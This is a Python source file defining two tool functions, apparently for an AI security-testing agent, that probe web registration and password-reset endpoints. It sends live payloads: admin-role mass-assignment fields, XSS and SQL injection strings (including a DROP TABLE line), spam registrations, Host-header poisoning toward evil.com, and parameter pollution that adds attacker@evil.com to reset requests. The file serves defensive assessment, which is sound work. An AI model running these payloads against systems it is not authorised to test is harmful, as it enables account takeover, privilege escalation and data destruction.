import json
import requests
from src.sdk.tool import function_tool
from .common import _DEFAULT_HEADERS, _TIMEOUT, register_appsec_vulnerability


@function_tool()
async def registration_tester(
    url: str,
    username_field: str = "email",
    password_field: str = "password",
    extra_fields: str = "",
    cookies: str = "",
) -> str:
    """
    Test a signup/registration page for authentication and logic vulnerabilities.

    Covers:
    - Username/email enumeration via differing error messages
    - Weak password policy (no minimum length, no complexity)
    - Mass assignment (injecting admin/role fields into the POST body)
    - CSRF protection on the registration form
    - Rate limiting / no lockout after repeated registrations
    - Duplicate account with case-variant email (account takeover setup)
    - Stored XSS via registration fields (name, username)
    - SQL injection in registration fields
    - Auto-login after registration (no email verification bypass)
    - Response body leaking internal data or stack traces

    Args:
        url: Full URL of the registration/signup endpoint (e.g. http://target/users/new)
        username_field: Name of the email/username field in the form (default: email)
        password_field: Name of the password field in the form (default: password)
        extra_fields: Additional required fields as "field=value,field2=value2"
        cookies: Session cookies if the registration page requires prior auth

    Returns:
        Registration vulnerability findings
    """
    import random
    import string

    out = [f"=== Registration Tester: {url}", ""]

    # Resolve vhost if needed
    try:
        from src.tools.http_proxy import resolve_vhost as _resolve_vhost
        _fetch_url, _vhost_hdr = _resolve_vhost(url)
    except Exception:
        _fetch_url, _vhost_hdr = url, ""

    hdrs = {
        **_DEFAULT_HEADERS,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/json,*/*",
    }
    if _vhost_hdr:
        hdrs["Host"] = _vhost_hdr
    if cookies:
        hdrs["Cookie"] = cookies

    # Parse extra fields
    extra = {}
    for pair in (extra_fields or "").split(","):
        pair = pair.strip()
        if "=" in pair:
            k, v = pair.split("=", 1)
            extra[k.strip()] = v.strip()

    findings = []
    info_lines = []

    # ── STEP 1: Fetch the registration form ─────────────────────────────────
    out.append("── Step 1: Fetch Registration Form ─────────────────────")
    csrf_token = ""
    csrf_param = "authenticity_token"
    try:
        import re as _re
        page_r = requests.get(_fetch_url, headers=hdrs, timeout=_TIMEOUT, verify=False)
        page_html = page_r.text or ""

        # Detect CSRF token (Rails meta tag, hidden input)
        m = _re.search(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']', page_html, _re.I)
        if not m:
            m = _re.search(r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']csrf-token["\']', page_html, _re.I)
        if m:
            csrf_token = m.group(1)
        else:
            m2 = _re.search(r'<input[^>]+name=["\']authenticity_token["\'][^>]+value=["\']([^"\']+)["\']', page_html, _re.I)
            if m2:
                csrf_token = m2.group(1)
            else:
                m3 = _re.search(r'<input[^>]+name=["\'](_token|csrf_token|__RequestVerificationToken)["\'][^>]+value=["\']([^"\']+)["\']', page_html, _re.I)
                if m3:
                    csrf_param = m3.group(1)
                    csrf_token = m3.group(2)

        # Extract cookies from response
        for ck in page_r.cookies:
            hdrs["Cookie"] = hdrs.get("Cookie", "") + f"; {ck.name}={ck.value}"
        hdrs["Cookie"] = hdrs["Cookie"].strip("; ")

        if csrf_token:
            out.append(f"  ✅ CSRF token found ({csrf_param}={csrf_token[:30]}...)")
        else:
            out.append("  ⚠️  No CSRF token found — noting as issue")
            findings.append(("MEDIUM", "CSRF — No token on registration form",
                             "Registration form has no CSRF token. "
                             "An attacker can silently register accounts on behalf of visitors."))

        # Check if form fields discoverable
        form_fields = _re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', page_html, _re.I)
        if form_fields:
            out.append(f"  📋 Form fields detected: {', '.join(form_fields)}")
        else:
            out.append("  ℹ️  No input fields found (may be JS-rendered)")

        # ── REGISTRATION DISABLED DETECTION ────────────────────────────────
        # WordPress and many CMSes disable registration by default and show a
        # message instead of a form. Testing mass assignment / weak passwords
        # on a disabled registration page produces only false positives.
        _disabled_keywords = [
            "registration has been disabled",
            "registration is not allowed",
            "user registration is currently not allowed",
            "registration=disabled",
            "registration is disabled",
            "currently not accepting",
            "signup is disabled",
            "registration closed",
        ]
        _page_lower = page_html.lower()
        _is_disabled = any(kw in _page_lower for kw in _disabled_keywords)
        # Also detect login-only forms (no password confirmation, no register action)
        _has_password_confirm = any(f in form_fields for f in [
            "password_confirmation", "password2", "confirm_password",
            "pass2", "user[password_confirmation]", "password-confirm",
        ]) if form_fields else False
        _has_register_action = "register" in page_html.lower() or "signup" in page_html.lower()
        # If no password fields at all, or only login-type fields, this isn't a registration form
        _password_fields = [f for f in form_fields if "pass" in f.lower()]
        _is_login_form = (
            len(_password_fields) == 1
            and not _has_password_confirm
            and "log" in page_html.lower()[:5000]
            and not _has_register_action
        )

        if _is_disabled:
            out.append("\n  🛑 REGISTRATION IS DISABLED — skipping all registration tests")
            out.append(f"     Detected keyword: {[kw for kw in _disabled_keywords if kw in _page_lower][0]}")
            out.append("     Mass assignment, weak password, and rate limit tests are NOT applicable.")
            out.append(f"\n{'='*55}")
            out.append("## REGISTRATION TEST SUMMARY")
            out.append("Total findings: 0")
            out.append("ℹ️  Registration is disabled on this endpoint. No vulnerabilities to test.")
            return "\n".join(out)

        if _is_login_form and not _has_register_action:
            out.append("\n  ⚠️  This appears to be a LOGIN form, not a registration form.")
            out.append(f"     Fields: {form_fields}")
            out.append("     Results below may be unreliable — consider using auth_login instead.")

    except Exception as e:
        out.append(f"  × Could not fetch form: {e}")
        return "\n".join(out)

    def _build_body(email, password, extra_inject=None):
        data = {username_field: email, password_field: password, **extra}
        if csrf_token:
            data[csrf_param] = csrf_token
        if extra_inject:
            data.update(extra_inject)
        return data

    def _rand_str(n=8):
        return ''.join(random.choices(string.ascii_lowercase, k=n))

    # ── STEP 2: Weak password policy ────────────────────────────────────────
    out.append("\n── Step 2: Weak Password Policy ─────────────────────────")
    weak_passwords = ["a", "1", "ab", "abc", "1234", "passw"]
    for weak_pw in weak_passwords:
        test_email = f"test_{_rand_str()}@test.com"
        try:
            r = requests.post(_fetch_url,
                              data=_build_body(test_email, weak_pw),
                              headers=hdrs, timeout=_TIMEOUT,
                              allow_redirects=True, verify=False)
            body = r.text or ""
            # Signs of success: redirect to dashboard/profile, no "password" error
            success_keys = ["welcome", "dashboard", "profile", "logged", "created",
                            "success", "account", "verify", "confirmation"]
            error_keys = ["too short", "minimum", "weak", "complexity", "invalid password",
                          "must be at least", "at least 8", "not strong"]
            if any(k in body.lower() for k in success_keys) and not any(k in body.lower() for k in error_keys):
                findings.append(("HIGH", f"Weak Password Accepted: '{weak_pw}'",
                                 f"The application accepted '{weak_pw}' as a valid password with no rejection. "
                                 f"HTTP {r.status_code}. No minimum length / complexity policy enforced."))
                out.append(f"  🔴 Accepted weak password: '{weak_pw}'")
                break  # One weak password confirmed is enough
            else:
                out.append(f"  ✅ Rejected: '{weak_pw}'")
        except Exception as e:
            out.append(f"  × Error testing '{weak_pw}': {e}")

    # ── STEP 3: Username/email enumeration ──────────────────────────────────
    out.append("\n── Step 3: Username/Email Enumeration ───────────────────")
    existing_email = f"admin@{url.split('/')[2].split(':')[0]}"
    nonexist_email = f"zzz_{_rand_str(12)}@nonexistent-xyz.com"
    try:
        r_existing = requests.post(_fetch_url,
                                   data=_build_body(existing_email, "SomePassword123!"),
                                   headers=hdrs, timeout=_TIMEOUT,
                                   allow_redirects=False, verify=False)
        r_nonexist = requests.post(_fetch_url,
                                   data=_build_body(nonexist_email, "SomePassword123!"),
                                   headers=hdrs, timeout=_TIMEOUT,
                                   allow_redirects=False, verify=False)
        # Compare responses
        same_status = (r_existing.status_code == r_nonexist.status_code)
        body_existing = (r_existing.text or "").lower()
        body_nonexist = (r_nonexist.text or "").lower()
        enum_keywords = ["already taken", "already registered", "already exists",
                         "email taken", "account exists", "duplicate", "in use"]
        existing_leaked = any(k in body_existing for k in enum_keywords)
        nonexist_leaked = any(k in body_nonexist for k in enum_keywords)
        if existing_leaked and not nonexist_leaked:
            findings.append(("MEDIUM", "Username/Email Enumeration via Registration",
                             f"Different error message for existing vs non-existing account. "
                             f"Existing email response contains: {[k for k in enum_keywords if k in body_existing]}"))
            out.append("  🟠 Enumeration: existing email reveals different message")
        elif not same_status:
            findings.append(("LOW", "Potential Username/Email Enumeration (HTTP status differs)",
                             f"Existing email → HTTP {r_existing.status_code}, "
                             f"unknown email → HTTP {r_nonexist.status_code}"))
            out.append(f"  ⚠️  Status differs: {r_existing.status_code} vs {r_nonexist.status_code}")
        else:
            out.append("  ✅ Same response for both — no enumeration detected")
    except Exception as e:
        out.append(f"  × Error: {e}")

    # ── STEP 4: Mass assignment / privilege escalation via registration ──────
    out.append("\n── Step 4: Mass Assignment (Privilege Escalation) ───────")
    mass_assign_payloads = [
        {"admin": "true"},
        {"admin": "1"},
        {"role": "admin"},
        {"role": "administrator"},
        {"is_admin": "true"},
        {"is_admin": "1"},
        {"verified": "true"},
        {"confirmed": "true"},
        {"user[admin]": "true"},
        {"user[role]": "admin"},
    ]
    mass_assign_test_email = f"masstest_{_rand_str()}@test.com"
    for extra_inject in mass_assign_payloads:
        try:
            r = requests.post(_fetch_url,
                              data=_build_body(mass_assign_test_email, "Password123!", extra_inject),
                              headers=hdrs, timeout=_TIMEOUT,
                              allow_redirects=True, verify=False)
            body = (r.text or "").lower()
            priv_keys = ["admin", "administrator", "dashboard", "panel", "privileged",
                         "welcome, admin", "role: admin"]
            if any(k in body for k in priv_keys) and r.status_code in (200, 201, 302):
                findings.append(("CRITICAL", f"Mass Assignment — Privilege Escalation via {list(extra_inject.keys())[0]}",
                                 f"Injecting `{extra_inject}` into registration body resulted in a successful "
                                 f"response containing admin/privileged keywords. HTTP {r.status_code}."))
                out.append(f"  🔴 CRITICAL: mass assignment accepted {extra_inject}")
                break
            else:
                out.append(f"  ✅ Rejected: {extra_inject}")
        except Exception as e:
            out.append(f"  × Error: {e}")
            break

    # ── STEP 5: Stored XSS via registration fields ───────────────────────────
    out.append("\n── Step 5: Stored XSS via Name/Username Field ───────────")
    xss_email = f"xss_{_rand_str()}@test.com"
    xss_payloads = [
        ("<script>alert('xss')</script>", "username"),
        ("<img src=x onerror=alert(1)>", "name"),
        ("'\"><script>alert(1)</script>", "first_name"),
    ]
    for payload, fieldname in xss_payloads:
        try:
            form_data = _build_body(xss_email, "Password123!")
            form_data[fieldname] = payload
            r = requests.post(_fetch_url, data=form_data, headers=hdrs,
                              timeout=_TIMEOUT, allow_redirects=True, verify=False)
            if r.status_code in (200, 201, 302) and "error" not in (r.text or "").lower()[:300]:
                # Attempt to check if payload was stored and reflected
                info_lines.append(f"  ℹ️  XSS payload submitted in '{fieldname}' — verify reflection in profile page")
                out.append(f"  ℹ️  Payload accepted in '{fieldname}': {payload[:40]}")
        except Exception as e:
            out.append(f"  × Error: {e}")
            break

    # ── STEP 6: SQL injection in username field ───────────────────────────────
    out.append("\n── Step 6: SQLi in Username/Email Field ─────────────────")
    sqli_email = f"sqlitest_{_rand_str()}"
    sqli_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "admin'--", "' OR 1=1--"]
    for payload in sqli_payloads:
        try:
            r = requests.post(_fetch_url,
                              data=_build_body(f"{sqli_email}{payload}@test.com",
                                              "Password123!"),
                              headers=hdrs, timeout=_TIMEOUT, allow_redirects=False, verify=False)
            body = (r.text or "").lower()
            sql_errors = ["sql", "mysql", "sqlite", "postgres", "syntax error",
                          "ora-", "db2", "unclosed quotation", "unterminated", "pg_"]
            if any(k in body for k in sql_errors):
                findings.append(("CRITICAL", "SQL Injection in Registration Email Field",
                                 f"Payload `{payload}` triggered SQL error in registration endpoint. "
                                 f"Response contains: {[k for k in sql_errors if k in body]}"))
                out.append(f"  🔴 SQL error with payload: {payload}")
                break
            else:
                out.append(f"  ✅ No SQL error: {payload}")
        except Exception as e:
            out.append(f"  × Error: {e}")
            break

    # ── STEP 7: Rate limiting ────────────────────────────────────────────────
    out.append("\n── Step 7: Rate Limiting / Lockout ──────────────────────")
    rate_codes = []
    for i in range(10):
        spam_email = f"spam{i}_{_rand_str()}@test.com"
        try:
            r = requests.post(_fetch_url,
                              data=_build_body(spam_email, "Password123!"),
                              headers=hdrs, timeout=_TIMEOUT,
                              allow_redirects=False, verify=False)
            rate_codes.append(r.status_code)
        except Exception:
            rate_codes.append(0)
    rate_limited = any(c in (429, 503, 403) for c in rate_codes)
    if rate_limited:
        out.append(f"  ✅ Rate limiting detected: {set(rate_codes)}")
    else:
        out.append(f"  🟡 No rate limiting after 10 rapid requests: codes = {set(rate_codes)}")
        findings.append(("LOW", "No Rate Limiting on Registration",
                         "10 rapid registration attempts returned no 429/503. "
                         "Attacker can create unlimited accounts or spam the system."))

    # ── Summary ──────────────────────────────────────────────────────────────
    out.append("\n" + "=" * 55)
    out.append("## REGISTRATION TEST SUMMARY")
    out.append(f"Total findings: {len(findings)}")
    if findings:
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        findings.sort(key=lambda x: severity_order.get(x[0], 5))
        for sev, title, desc in findings:
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(sev, "ℹ️")
            out.append(f"\n{icon} [{sev}] {title}")
            out.append(f"   {desc}")
            await register_appsec_vulnerability(
                target_url=url, vuln_type=title, severity=sev,
                parameter=username_field, payload="", evidence=desc
            )
    else:
        out.append("✅ No obvious registration vulnerabilities detected")
    if info_lines:
        out.append("\nℹ️  Manual verification needed:")
        out.extend(info_lines)

    return "\n".join(out)

@function_tool()
async def password_reset_tester(url: str, email: str, method: str = "POST", data_params: str = "", json_body: bool = False, cookies: str = "") -> str:
    """
    Test Password Reset flows for vulnerabilities like Host Header Injection,
    Account Takeover via parameter pollution, and user enumeration.
    
    Args:
        url: URL of the password reset endpoint
        email: Target email to request reset for
        method: HTTP method (GET or POST)
        data_params: Format like "email={email}&csrf_token=xyz" (use {email} placeholder)
        json_body: Set to True if the payload should be sent as JSON
        cookies: Optional session cookies (e.g. for authenticated resets)
        
    Returns:
        Results of password reset flow vulnerabilities.
    """
    import requests
    
    out = [f"=== Password Reset Tester: {url}", ""]
    findings = []
    
    headers = {"User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0 Reset-Tester)"}
    if cookies:
        headers["Cookie"] = cookies
    
    # ── Test 1: Host Header Poisoning ───────────────────────────────────────
    out.append("── Attack 1: Host Header Poisoning ────────")
    payload = data_params.replace("{email}", email) if data_params else f"email={email}"
    
    for spoof_host in ["evil.com", "attacker.com", "localhost"]:
        req_headers = headers.copy()
        req_headers["Host"] = spoof_host
        req_headers["X-Forwarded-Host"] = spoof_host
        req_headers["X-Forwarded-Server"] = spoof_host
        
        try:
            r = None
            if method.upper() == "POST":
                if json_body:
                    try:
                        js_data = json.loads(payload)
                        req_headers["Content-Type"] = "application/json"
                        r = requests.post(url, json=js_data, headers=req_headers, timeout=10, verify=False, allow_redirects=False)
                    except json.JSONDecodeError:
                        out.append("  [Error] data_params is not valid JSON string")
                        break
                else:
                    req_headers["Content-Type"] = "application/x-www-form-urlencoded"
                    r = requests.post(url, data=payload, headers=req_headers, timeout=10, verify=False, allow_redirects=False)
            else:
                test_url = url
                if "{email}" in test_url:
                    test_url = test_url.replace("{email}", email)
                r = requests.get(test_url, headers=req_headers, timeout=10, verify=False, allow_redirects=False)
                
            if r is not None and r.status_code < 400:
                out.append(f"  ✅ Request with Spoofed Host ({spoof_host}) succeeded (HTTP {r.status_code})")
                findings.append(f"HIGH → Host Header Poisoning potential. Check victim's email. If the reset link points to {spoof_host}, Account Takeover is possible.")
                break
        except Exception as e:
            out.append(f"  × Request failed for {spoof_host}: {e}")
            break
            
    # ── Test 2: HTTP Parameter Pollution (HPP) / Array Injection ─────────
    out.append("\n── Attack 2: Array / Multiple Email Injection ────────")
    hpp_payloads = []
    if json_body and data_params:
        try:
            base_json = json.loads(payload)
            # Try array
            inj1 = base_json.copy()
            for k, v in inj1.items():
                if v == email: inj1[k] = [email, "attacker@evil.com"]
            hpp_payloads.append(("JSON Array", inj1))
            
            # Try duplicate key
            raw_dup = payload.replace(f'"{email}"', f'"{email}", "email": "attacker@evil.com"')
            hpp_payloads.append(("JSON Duplicate Key", raw_dup))
            
        except json.JSONDecodeError:
            pass
    elif data_params:
        # URL Encoded HPP
        hpp1 = payload + "&email=attacker@evil.com"
        hpp_payloads.append(("HPP Append", hpp1))
        
        # Array notation
        hpp2 = payload.replace(f"email={email}", f"email[]={email}&email[]=attacker@evil.com")
        if hpp2 != payload:
            hpp_payloads.append(("Array Notation", hpp2))
            
    for name, inj_payload in hpp_payloads:
        try:
            req_headers = headers.copy()
            r = None
            if method.upper() == "POST":
                if "JSON" in name:
                    req_headers["Content-Type"] = "application/json"
                    if isinstance(inj_payload, dict):
                        r = requests.post(url, json=inj_payload, headers=req_headers, timeout=10, verify=False)
                    else:
                        r = requests.post(url, data=inj_payload, headers=req_headers, timeout=10, verify=False)
                else:
                    req_headers["Content-Type"] = "application/x-www-form-urlencoded"
                    r = requests.post(url, data=inj_payload, headers=req_headers, timeout=10, verify=False)
                    
            if r is not None and r.status_code < 400:
                out.append(f"  ✅ {name} succeeded (HTTP {r.status_code})")
                findings.append(f"MEDIUM → The server processed {name} payload. Check if reset token was sent to attacker@evil.com.")
        except Exception:
            pass
            
    if findings:
        out.append("\n── FINDINGS ──────────────────────────────────")
        for f in findings:
            out.append(f"🔴 {f}")
            severity = "HIGH"
            if "→" in f:
                sev_part = f.split("→")[0].strip()
                if sev_part in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
                    severity = sev_part
            await register_appsec_vulnerability(
                target_url=url, vuln_type="Password Reset Vulnerability", severity=severity,
                parameter=email, payload="", evidence=f
            )
    else:
        out.append("\n✅ No obvious vulnerabilities found via host poisoning or HPP. Check emails manually.")

    return "\n".join(out)
